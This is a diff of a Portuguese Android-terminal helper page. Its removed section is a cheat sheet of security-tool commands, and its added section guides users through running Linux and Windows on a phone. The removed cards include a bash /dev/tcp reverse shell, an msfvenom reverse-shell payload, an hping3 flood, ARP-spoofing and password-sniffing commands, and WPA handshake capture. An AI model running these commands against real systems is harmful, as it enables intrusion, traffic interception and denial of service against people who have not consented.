-<div class='card' data-cat='Análise de Tráfego'><h3>ngrep - Buscar strings em pacotes</h3><div class='tags'><span>ngrep</span><span>grep de rede</span><span>string em pacote</span></div><div class='cmd-wrap'><code class='cmd'>sudo ngrep -q &#x27;password&#x27; -d eth0</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install ngrep</li><li>Rode: sudo ngrep -q &#x27;password&#x27; -d eth0</li><li>Ele procura strings específicas no tráfego em tempo real.</li><li>Use em rede própria para teste.</li></ol></div></div>
-<div class='card' data-cat='Análise de Tráfego'><h3>arpwatch - Monitorar mudanças ARP</h3><div class='tags'><span>arpwatch</span><span>monitorar arp</span><span>detectar spoof</span></div><div class='cmd-wrap'><code class='cmd'>sudo arpwatch -i eth0</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install arpwatch</li><li>Rode: sudo arpwatch -i eth0</li><li>Ele detecta mudanças de endereço ARP (possível ARP spoofing).</li><li>Verifique o log /var/log/messages ou /var/lib/arpwatch.</li></ol></div></div>
-<div class='card' data-cat='Análise de Tráfego'><h3>tcptraceroute - Traceroute via TCP</h3><div class='tags'><span>tcptraceroute</span><span>traceroute tcp</span><span>firewall</span></div><div class='cmd-wrap'><code class='cmd'>tcptraceroute alvo.com 80</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install tcptraceroute</li><li>Rode: tcptraceroute alvo.com 80</li><li>Usa TCP (porta específica) em vez de ICMP, atravessa firewalls melhor.</li><li>Ótimo para mapear rede atrás de filtros.</li></ol></div></div>
-<div class='card' data-cat='Forense Digital'><h3>Autopsy - Análise forense de disco</h3><div class='tags'><span>autopsy</span><span>análise forense</span><span>disco</span></div><div class='cmd-wrap'><code class='cmd'>autopsy</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install autopsy</li><li>Rode: autopsy</li><li>Crie um novo caso e adicione a imagem/disco.</li><li>Analisa arquivos deletados, históricos e metadados.</li></ol></div></div>
-<div class='card' data-cat='Forense Digital'><h3>dd - Criar imagem de disco</h3><div class='tags'><span>dd</span><span>copiar disco</span><span>imagem forense</span></div><div class='cmd-wrap'><code class='cmd'>sudo dd if=/dev/sda of=/tmp/imagem.dd bs=4M</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Identifique o disco: sudo fdisk -l</li><li>Rode: sudo dd if=/dev/sda of=/tmp/imagem.dd bs=4M</li><li>A imagem preserva o conteúdo para análise.</li><li>Nunca inverta if/of para não sobrescrever.</li></ol></div></div>
-<div class='card' data-cat='Forense Digital'><h3>hashdeep - Verificar integridade</h3><div class='tags'><span>hashdeep</span><span>hash</span><span>integridade</span><span>comparar</span></div><div class='cmd-wrap'><code class='cmd'>hashdeep -r /pasta &gt; hashes.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: hashdeep -a /pasta &gt; hashes.txt</li><li>Gera hashes de todos os arquivos.</li><li>Compare depois com hashdeep -a -k hashes.txt /pasta para detectar alterações.</li></ol></div></div>
-<div class='card' data-cat='Sistema / Controle'><h3>crontab - Agendar tarefas</h3><div class='tags'><span>crontab</span><span>agendar tarefa</span><span>persistência</span></div><div class='cmd-wrap'><code class='cmd'>crontab -e</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: crontab -e para editar.</li><li>Adicione linha: * * * * * comando</li><li>Isso roda o comando a cada minuto.</li><li>Use para automação legítima.</li></ol></div></div>
-<div class='card' data-cat='Sistema / Controle'><h3>systemctl - Gerenciar serviços</h3><div class='tags'><span>systemctl</span><span>serviços</span><span>habilitar</span></div><div class='cmd-wrap'><code class='cmd'>sudo systemctl status ssh</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>status: sudo systemctl status ssh</li><li>habilitar: sudo systemctl enable ssh</li><li>iniciar: sudo systemctl start ssh</li><li>parar: sudo systemctl stop ssh</li></ol></div></div>
-<div class='card' data-cat='Wireless Avançado'><h3>hcxdumptool - Capturar PMKID/handshakes</h3><div class='tags'><span>hcxdumptool</span><span>wpa</span><span>pmkid</span><span>captura</span></div><div class='cmd-wrap'><code class='cmd'>sudo hcxdumptool -i wlan0 -o dump.pcapng</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install hcxdumptool</li><li>Rode: sudo hcxdumptool -i wlan0 -o dump.pcapng</li><li>Captura handshakes e PMKIDs de redes próximas.</li><li>Depois converta com hcxpcapngtool e quebre com hashcat.</li><li>Somente em rede própria/autoriada.</li></ol></div></div>
-<div class='card' data-cat='Wireless Avançado'><h3>airdecap-ng - Descriptografar pcap wifi</h3><div class='tags'><span>wireshark</span><span>airdecap</span><span>decrypt</span><span>pcap</span></div><div class='cmd-wrap'><code class='cmd'>airdecap-ng -p senha -E SSID captura.pcap</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: airdecap-ng -e SSID captura.pcap</li><li>Se tiver a senha, use -p senha</li><li>Gera arquivo decodificado para análise.</li></ol></div></div>
-<div class='card' data-cat='Hacking Android'><h3>AndroNix - Kali/Termux no Android (root)</h3><div class='tags'><span>andronix</span><span>kali no android</span><span>hackear android</span></div><div class='cmd-wrap'><code class='cmd'>apt update
-apt install andronix
-./andronix-setup</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: apt update</li><li>Instale: apt install andronix (ou baixe o app).</li><li>Execute o setup e escolha Kali.</li><li>Permite rodar Kali com mais controle no Android.</li></ol></div></div>
-<div class='card' data-cat='Cracking Android'><h3>apktool - Decompilar APK de apps</h3><div class='tags'><span>apktool</span><span>decompilar apk</span><span>engenharia reversa</span></div><div class='cmd-wrap'><code class='cmd'>apktool d app.apk -o saida</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: pkg install apktool -y (ou apt no Kali).</li><li>Rode: apktool d app.apk -o saida</li><li>Extrai recursos e código-fonte smali do APK.</li><li>Útil para análise e testes de apps Android.</li></ol></div></div>
-<div class='card' data-cat='Cracking Android'><h3>jadx - Decompilar APK para Java</h3><div class='tags'><span>jadx</span><span>decompilar java</span><span>apk para java</span></div><div class='cmd-wrap'><code class='cmd'>jadx -d saida app.apk</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: apt install jadx</li><li>Rode: jadx -d saida app.apk</li><li>Converte o APK em código Java legível.</li><li>Use para análise de segurança de apps.</li></ol></div></div>
-<div class='card' data-cat='Cracking Android'><h3>dex2jar - Converter DEX para JAR</h3><div class='tags'><span>dex2jar</span><span>dex para jar</span><span>classes</span></div><div class='cmd-wrap'><code class='cmd'>d2j-dex2jar app.apk -o app.jar</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: apt install dex2jar</li><li>Rode: d2j-dex2jar app.apk -o app.jar</li><li>Gera o JAR para abrir num decompilador.</li><li>Analise com jadx-gui ou similar.</li></ol></div></div>
-<div class='card' data-cat='Ciberataques'><h3>Ataque DDoS - Tipos (Só em laboratório)</h3><div class='tags'><span>ddos</span><span>ataque de negação</span><span>stress test</span></div><div class='cmd-wrap'><code class='cmd'># TCP Flood (hping3):
-sudo hping3 --flood -p 80 -S alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Reconheça que DDoS contra terceiros é crime.</li><li>Tipos: SYN flood, UDP flood, HTTP flood, Slowloris.</li><li>Ferramentas: hping3, slowloris, goldeneye, xerxes.</li><li>Use SOMENTE em servidores seus ou com autorização por escrito.</li></ol></div></div>
-<div class='card' data-cat='Ciberataques'><h3>Dunden/Torshammer - Ferramentas DDoS</h3><div class='tags'><span>dunder</span><span>ddos</span><span>tcp flood</span></div><div class='cmd-wrap'><code class='cmd'># dunden (exemplo educativo)
-python3 dunden.py &lt;IP&gt; &lt;PORTA&gt;</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>São scripts Python de teste de carga TCP.</li><li>Só rodar em servidores próprios/autoriados.</li><li>Alternativa mais segura: usar hping3 ou ab (ApacheBench) para teste.</li><li>DDoS real contra terceiros é crime.</li></ol></div></div>
-<div class='card' data-cat='Ciberataques'><h3>Email bomb / SMTP - Ataques de e-mail</h3><div class='tags'><span>smtp</span><span>email bomb</span><span>spam</span></div><div class='cmd-wrap'><code class='cmd'># mail bomb scripts (educativo)
-# Não executar contra terceiros</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Entenda que flood de e-mail é ilegal.</li><li>Use apenas em testes de stress de servidor próprio de e-mail.</li><li>Para testes legítimos use: swaks (SMTP test).</li><li>swaks --to email@teste.com --from root@teste --server localhostSomente autorizado.</li></ol></div></div>
-<div class='card' data-cat='Reconhecimento Avançado'><h3>amass - Enumeração de subdomínios</h3><div class='tags'><span>amass</span><span>subdominios</span><span>enumeração</span></div><div class='cmd-wrap'><code class='cmd'>amass enum -passive -d alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: apt install amass</li><li>Rode: amass enum -passive -d alvo.com</li><li>Descobre subdomínios via fontes passivas.</li><li>Use -active para teste mais agressivo.</li></ol></div></div>
-<div class='card' data-cat='Reconhecimento Avançado'><h3>subfinder - Descobrir subdomínios rápido</h3><div class='tags'><span>subfinder</span><span>subdominio</span><span>rapido</span></div><div class='cmd-wrap'><code class='cmd'>subfinder -d alvo.com -silent</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</li><li>Rode: subfinder -d alvo.com</li><li>Use -silent para só a lista de nomes.</li></ol></div></div>
-<div class='card' data-cat='Reconhecimento Avançado'><h3>nuclei - Scanner de vulnerabilidades</h3><div class='tags'><span>nuclei</span><span>scanner vulnerabilidade</span><span>templates</span></div><div class='cmd-wrap'><code class='cmd'>nuclei -u http://alvo.com -t cves/</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: go install .../projectdiscovery/nuclei/v3/cmd/nuclei@latest</li><li>Rode: nuclei -u http://alvo.com</li><li>Usa templates de CVEs e falhas.</li><li>Somente em hosts autorizados.</li></ol></div></div>
-<div class='card' data-cat='Ataques de Rede'><h3>ettercap - MITM e sniffing</h3><div class='tags'><span>ettercap</span><span>mitm</span><span>sniff</span><span>arp</span></div><div class='cmd-wrap'><code class='cmd'>sudo ettercap -T -M arp:remote /192.168.1.10// /</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install ettercap-text-only</li><li>Rode: sudo ettercap -T -M arp:remote /192.168.1.10//</li><li>Faz ARP spoofing e intercepta o tráfego.</li><li>Somente em rede própria/autoriada.</li></ol></div></div>
-<div class='card' data-cat='Ataques de Rede'><h3>dsniff - Capturar senhas na rede</h3><div class='tags'><span>dsniff</span><span>capturar senha</span><span>mitm</span></div><div class='cmd-wrap'><code class='cmd'>sudo dsniff -i eth0</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install dsniff</li><li>Rode: sudo dsniff -i eth0</li><li>Captura senhas enviadas em texto claro.</li><li>Somente em rede própria.</li></ol></div></div>
-<div class='card' data-cat='Ataques de Rede'><h3>macof - Flood de tabela MAC</h3><div class='tags'><span>macof</span><span>flood mac</span><span>switch</span></div><div class='cmd-wrap'><code class='cmd'>sudo macof -i eth0</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Instale: sudo apt install dsniff (inclui macof)</li><li>Rode: sudo macof -i eth0</li><li>Inunda a tabela MAC do switch para sniffing.</li><li>Somente em teste autorizado de rede.</li></ol></div></div>
-<div class='card' data-cat='Reverse Shell / C2'><h3>msfvenom - Gerar reverse shell</h3><div class='tags'><span>msfvenom</span><span>reverse shell</span><span>payload</span></div><div class='cmd-wrap'><code class='cmd'>msfvenom -p linux/x64/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f elf &gt; shell.elf</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Substitua SEU_IP pelo seu IP.</li><li>Rode o msfvenom com o payload.</li><li>No Metasploit: use exploit/multi/handler, set payload, LHOST, LPORT, run.</li><li>Só em lab de autorização.</li></ol></div></div>
-<div class='card' data-cat='Reverse Shell'><h3>Reverse shell em bash (educativo)</h3><div class='tags'><span>bash reverse</span><span>one liner</span><span>netcat</span></div><div class='cmd-wrap'><code class='cmd'>bash -i &gt;&amp; /dev/tcp/SEU_IP/4444 0&gt;&amp;1</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>No seu lado, ouça: nc -lvnp 4444</li><li>No alvo (lab), rode o comando bash.</li><li>Recebe um shell interativo.</li><li>Somente em máquinas autorizadas.</li></ol></div></div>
-</div>
+<main>
+
+<!-- ============ ABA EMULAR ============ -->
+<section id="tab-emular">
+  <div class="hero">
+    <h1>🖥️ Transforme seu celular num computador</h1>
+    <p>Rode Kali, Ubuntu, Debian, XFCE4, outras distros Linux e até Windows no Android — com VNC, Termux, Termux:X11, PC virtual e nuvem.</p>
+  </div>
+
+  <div class="sec-title"><span class="bar"></span>Escolha o sistema</div>
+  <div class="grid-distros" id="distro-grid">
+    <div class="distro-btn" data-d="kali" onclick="pickDistro('kali', this)"><div class="em">🐉</div><div class="nm">Kali Linux</div><div class="rl">Pentest (root)</div></div>
+    <div class="distro-btn" data-d="ubuntu" onclick="pickDistro('ubuntu', this)"><div class="em">🟠</div><div class="nm">Ubuntu</div><div class="rl">Desktop completo</div></div>
+    <div class="distro-btn" data-d="debian" onclick="pickDistro('debian', this)"><div class="em">🔴</div><div class="nm">Debian</div><div class="rl">Estável</div></div>
+    <div class="distro-btn" data-d="xfce" onclick="pickDistro('xfce', this)"><div class="em">🖱️</div><div class="nm">XFCE4</div><div class="rl">Leve (recomendado)</div></div>
+    <div class="distro-btn" data-d="linux" onclick="pickDistro('linux', this)"><div class="em">🐧</div><div class="nm">Linux (geral)</div><div class="rl">Arch, Fedora, Alpine</div></div>
+    <div class="distro-btn" data-d="windows" onclick="pickDistro('windows', this)"><div class="em">🪟</div><div class="nm">Windows</div><div class="rl">Winlator / Nuvem</div></div>
+  </div>
+
+  <div id="distro-panels"></div>
+
+  <div class="sec-title" style="margin-top:24px;"><span class="bar"></span>Métodos disponíveis</div>
+  <div id="methods-list"></div>
+
+  <div class="alert alert-warn">⚠️ <strong>Aviso:</strong> Ferramentas aqui são para estudo e uso <strong>autorizado</strong>. Nunca ataque sistemas que não são seus. Rodar distros no seu próprio aparelho é totalmente legal.</div>
+</section>
+
+<!-- ============ ABA COMANDOS ============ -->
+<section id="tab-comandos" class="hidden">
+  <div class="hero">
+    <h1>⌨️ Buscador de Comandos</h1>
+    <p>Todos os comandos do Termux e das ferramentas — com instalação e exemplo de uso.</p>
+  </div>
+  <div class="cat-bar" id="cat-bar"></div>
+  <div class="count-info" id="count-info"></div>
+  <div id="cmd-list"></div>
+</section>
+
+</main>
+
+<footer>
+  <b>T-TOOL</b> · Linux · Distros · Windows · Android<br>
+  Feito para rodar offline no seu aparelho 💚
+</footer>
+
+<div id="toast"></div>
 
 <script>
-// ---------- normalização (ignora acentos e caixa) ----------
-function normalize(s){
-  return (s||'').toString().normalize('NFD').replace(/[\u0300-\u036f]/g,'').toLowerCase();
+// ============================================================
+// DADOS: MÉTODOS DE EMULAÇÃO
+// ============================================================
+const METHODS = {
+  proot: {
+    ico: '📦', cls: 'mi-xfce', name: 'Termux + proot-distro', sub: 'Linux por linha de comando (sem root)', lvl: 'Fácil', lvlc: 'lvl-easy',
+    body: `
+      <div class="cmd-block">Passo a passo</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t">Atualize o Termux: <code>pkg update && pkg upgrade</code></div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t">Instale o proot-distro: <code>pkg install proot-distro</code></div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t">Veja as distros: <code>proot-distro list</code></div></div>
+      <div class="step"><div class="step-n">4</div><div class="step-t">Instale a distro: <code>proot-distro install ubuntu</code></div></div>
+      <div class="step"><div class="step-n">5</div><div class="step-t">Entre na distro: <code>proot-distro login ubuntu</code></div></div>
+      <div class="step"><div class="step-n">6</div><div class="step-t">Dentro dela, use como um Linux normal: <code>apt update && apt install <pacote></code></div></div>
+      <div class="cmd-block">Distros disponíveis (troque o nome)</div>
+      <pre>proot-distro install ubuntu
+proot-distro install debian
+proot-distro install kali
+proot-distro install archlinux
+proot-distro install alpine
+proot-distro install fedora
+proot-distro install opensuse
+proot-distro install void</pre>
+      <div class="alert alert-ok">✅ Ideal para: usar comandos Linux sem interface gráfica. Não precisa de root.</div>
+    `
+  },
+  vnc: {
+    ico: '🖱️', cls: 'mi-kali', name: 'Desktop via VNC (interface gráfica)', sub: 'Rode Ubuntu/XFCE4 com tela gráfica de verdade', lvl: 'Médio', lvlc: 'lvl-mid',
+    body: `
+      <div class="cmd-block">1) Prepare o Termux e a distro</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t"><code>pkg install proot-distro</code></div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t"><code>proot-distro install ubuntu</code></div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t"><code>proot-distro login ubuntu</code></div></div>
+      <div class="cmd-block">2) Dentro da distro, instale o desktop + VNC</div>
+      <pre>apt update && apt upgrade -y
+apt install xfce4 xfce4-goodies -y
+apt install tightvncserver -y
+apt install dbus-x11 -y
+# Crie a senha do VNC
+vncserver
+# (ele pede uma senha — digite e confirme)</pre>
+      <div class="cmd-block">3) Inicie o servidor gráfico</div>
+      <pre>vncserver :1 -geometry 1280x720 -depth 24</pre>
+      <div class="cmd-block">4) Conecte pelo celular</div>
+      <div class="step"><div class="step-n">4</div><div class="step-t">Instale o app <b>bVNC Viewer</b> ou <b>VNC Viewer</b> (RealVNC) na Play Store.</div></div>
+      <div class="step"><div class="step-n">5</div><div class="step-t">No app, adicione a conexão: endereço <code>localhost:5901</code>, senha a que você criou.</div></div>
+      <div class="step"><div class="step-n">6</div><div class="step-t">Pronto! Você verá o desktop XFCE4 rodando dentro do celular. 🎉</div></div>
+      <div class="cmd-block">Parar o servidor</div>
+      <pre>vncserver -kill :1</pre>
+      <div class="alert alert-info">💡 Use o desktop <b>XFCE4</b> — é o mais leve e rápido no celular. GNOME e KDE são pesados.</div>
+    `
+  },
+  x11: {
+    ico: '🪟', cls: 'mi-xfce', name: 'Termux:X11 (gráfico nativo)', sub: 'Mais rápido que VNC — X11 direto no Android', lvl: 'Médio', lvlc: 'lvl-mid',
+    body: `
+      <div class="cmd-block">1) Instale o app Termux:X11</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t">Baixe o <b>Termux:X11</b> no F-Droid (é um app separado do Termux).</div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t">No Termux, ative o repositório X11: <code>pkg install x11-repo</code></div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t">Instale o pacote de teclado/ponteiro: <code>pkg install termux-x11-nightly</code></div></div>
+      <div class="cmd-block">2) Instale a distro com desktop</div>
+      <pre>proot-distro install ubuntu
+proot-distro login ubuntu
+apt update && apt install xfce4 xfce4-goodies -y</pre>
+      <div class="cmd-block">3) Inicie o Termux:X11 e o desktop</div>
+      <pre># No Termux (fora da distro):
+termux-x11 :0 &
+proot-distro login ubuntu --shared-tmp -- \\ 
+  env DISPLAY=:0 startxfce4</pre>
+      <div class="step"><div class="step-n">4</div><div class="step-t">Abra o app <b>Termux:X11</b> — o desktop aparece.</div></div>
+      <div class="alert alert-ok">✅ Mais leve e fluido que VNC. Ideal para jogos e vídeos no desktop.</div>
+    `
+  },
+  nethunter: {
+    ico: '🐉', cls: 'mi-kali', name: 'Kali NetHunter (chroot completo)', sub: 'Kali Linux completo — requer root', lvl: 'Difícil', lvlc: 'lvl-hard',
+    body: `
+      <div class="cmd-block">Requisitos</div>
+      <div class="alert alert-warn">⚠️ Requer aparelho com <b>root</b> e kernel compatível. Sem root, use proot-distro (método acima).</div>
+      <div class="cmd-block">Passo a passo (resumo)</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t">Faça root no aparelho (desbloqueio de bootloader + Magisk).</div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t">Instale o <b>Kali NetHunter</b> (app) correspondente ao seu aparelho.</div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t">Abra o NetHunter → <b>Kali Chroot Manager</b> → instale o chroot.</div></div>
+      <div class="step"><div class="step-n">4</div><div class="step-t">Inicie o <b>Kali Chroot</b> e o <b>VNC</b> pelo próprio app.</div></div>
+      <div class="step"><div class="step-n">5</div><div class="step-t">Conecte no VNC (local) e você tem o Kali completo.</div></div>
+      <div class="alert alert-info">💡 NetHunter Keyboard & BadUSB exigem hardware/kernel específicos.</div>
+    `
+  },
+  andronix: {
+    ico: '🚀', cls: 'mi-ubuntu', name: 'Andronix · UserLAnd (fácil)', sub: 'Instaladores prontos — sem digitar código', lvl: 'Fácil', lvlc: 'lvl-easy',
+    body: `
+      <div class="cmd-block">UserLAnd (grátis, Play Store)</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t">Instale o <b>UserLAnd</b> na Play Store.</div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t">Escolha a distro (Ubuntu, Debian, Kali) e o método (SSH ou VNC).</div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t">Defina usuário e senha → ele instala sozinho.</div></div>
+      <div class="step"><div class="step-n">4</div><div class="step-t">Escolha <b>VNC</b> para ter interface gráfica.</div></div>
+      <div class="cmd-block">Andronix (pago, mais recursos)</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t">Instale <b>Andronix</b> na Play Store.</div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t">Escolha a distro e o desktop (XFCE, KDE, LXQt).</div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t">Copie o comando que o app gera e cole no Termux.</div></div>
+      <div class="alert alert-ok">✅ Melhor opção para quem não quer decorar comandos. Rápido e visual.</div>
+    `
+  },
+  winlator: {
+    ico: '🪟', cls: 'mi-windows', name: 'Winlator — Windows no Android', sub: 'Roda apps e jogos .exe via Wine + Box86/Box64', lvl: 'Médio', lvlc: 'lvl-mid',
+    body: `
+      <div class="cmd-block">O que é</div>
+      <div class="step"><div class="step-t">O <b>Winlator</b> é um app que roda programas Windows (.exe) no Android usando Wine + Box86/Box64. Não é um Windows completo, mas roda a maioria dos apps e jogos antigos.</div></div>
+      <div class="cmd-block">Instalação</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t">Baixe o APK do <b>Winlator</b> no GitHub (github.com/brunodev85/winlator) ou em repositórios de APK confiáveis.</div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t">Instale o APK (permita "instalar de fontes desconhecidas").</div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t">Abra o Winlator → ele cria um "container" (ambiente Windows).</div></div>
+      <div class="step"><div class="step-n">4</div><div class="step-t">Copie seus arquivos .exe para a pasta do container e execute.</div></div>
+      <div class="cmd-block">Alternativas</div>
+      <pre>Winlator      → Windows apps/jogos (recomendado)
+Mobox         → Wine + Termux (avançado)
+Termux + Wine → pkg install wine (limitado)</pre>
+      <div class="alert alert-info">💡 Para jogos pesados, use o <b>Winlator</b> em celular com Snapdragon potente. Requer bastante RAM.</div>
+    `
+  },
+  wine: {
+    ico: '🍷', cls: 'mi-windows', name: 'Termux + Wine + Box64', sub: 'Rodar .exe direto no Termux (avançado)', lvl: 'Difícil', lvlc: 'lvl-hard',
+    body: `
+      <div class="cmd-block">Passo a passo (avançado)</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t">Ative o repositório: <code>pkg install x11-repo tur-repo</code></div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t">Instale o Wine: <code>pkg install wine</code></div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t">Instale o Box64: <code>pkg install box64</code></div></div>
+      <div class="step"><div class="step-n">4</div><div class="step-t">Inicie o Wine: <code>winecfg</code></div></div>
+      <div class="step"><div class="step-n">5</div><div class="step-t">Execute um .exe: <code>wine programa.exe</code></div></div>
+      <div class="alert alert-warn">⚠️ Suporte limitado e instável. O Winlator é muito mais fácil para a mesma finalidade.</div>
+    `
+  },
+  cloud: {
+    ico: '☁️', cls: 'mi-cloud', name: 'PC Virtual na Nuvem (Windows/Linux real)', sub: 'Um computador completo via internet — qualquer Android', lvl: 'Fácil', lvlc: 'lvl-easy',
+    body: `
+      <div class="cmd-block">Opção A — Cloud PC pronto (Windows)</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t"><b>Windows 365 Cloud PC</b> (Microsoft) — Windows completo na nuvem.</div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t"><b>Azure Virtual Desktop</b> ou <b>AWS WorkSpaces</b> — máquinas virtuais empresariais.</div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t"><b>Shadow PC</b> — PC gamer na nuvem, acesso via app Android.</div></div>
+      <div class="step"><div class="step-n">4</div><div class="step-t">Instale o app <b>Microsoft Remote Desktop</b> e conecte.</div></div>
+      <div class="cmd-block">Opção B — VM própria (grátis/barato)</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t">Crie uma VM Linux no <b>Google Cloud</b> (e2-micro grátis) ou <b>AWS</b>.</div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t">Instale o VNC/RDP na VM: <code>sudo apt install xfce4 tightvncserver</code></div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t">Conecte do celular com <b>bVNC</b> ou <b>RD Client</b>.</div></div>
+      <div class="cmd-block">Opção C — Linux no navegador (instantâneo)</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t"><b>GitHub Codespaces</b>, <b>Gitpod</b> ou <b>replit</b> — Linux completo no navegador do celular.</div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t">Grátis com limite de horas. Sem instalar nada.</div></div>
+      <div class="alert alert-ok">✅ Melhor método para rodar Windows/Linux <b>de verdade</b> — a potência vem da nuvem, não do celular.</div>
+    `
+  },
+  remote: {
+    ico: '📡', cls: 'mi-cloud', name: 'Controlar o seu PC do celular', sub: 'Acessar seu computador real remotamente', lvl: 'Fácil', lvlc: 'lvl-easy',
+    body: `
+      <div class="cmd-block">Você tem um PC? Acesse de qualquer lugar</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t"><b>Chrome Remote Desktop</b> — grátis, funciona no Android. Instale no PC e no celular.</div></div>
+      <div class="step"><div class="step-n">2</div><div class="step-t"><b>AnyDesk</b> — rápido e simples, ótimo para Android.</div></div>
+      <div class="step"><div class="step-n">3</div><div class="step-t"><b>Microsoft Remote Desktop</b> — para PC Windows (RDP).</div></div>
+      <div class="step"><div class="step-n">4</div><div class="step-t"><b>Parsec</b> — para acesso fluido e jogos.</div></div>
+      <div class="cmd-block">No PC (exemplo com RDP)</div>
+      <pre># Linux: instale o servidor
+sudo apt install xrdp
+sudo systemctl enable xrdp</pre>
+      <div class="alert alert-info">💡 Isso permite usar a tela do PC de verdade pelo celular — o melhor "computador no celular" quando você já tem um computador.</div>
+    `
+  },
+  dex: {
+    ico: '🖥️', cls: 'mi-ubuntu', name: 'Samsung DeX / monitor externo', sub: 'Transformar o celular em desktop com tela grande', lvl: 'Fácil', lvlc: 'lvl-easy',
+    body: `
+      <div class="cmd-block">O que é</div>
+      <div class="step"><div class="step-t">Celulares <b>Samsung</b> com DeX (Galaxy S/Note/Tab) viram um "computador" quando ligados a um monitor via USB-C, com teclado e mouse.</div></div>
+      <div class="cmd-block">Como usar</div>
+      <div class="step"><div class="step-n">1</div><div class="step-t">Conecte o celular a um monitor/TV por <b>cabo USB-C → HDMI</b>.</div></div>
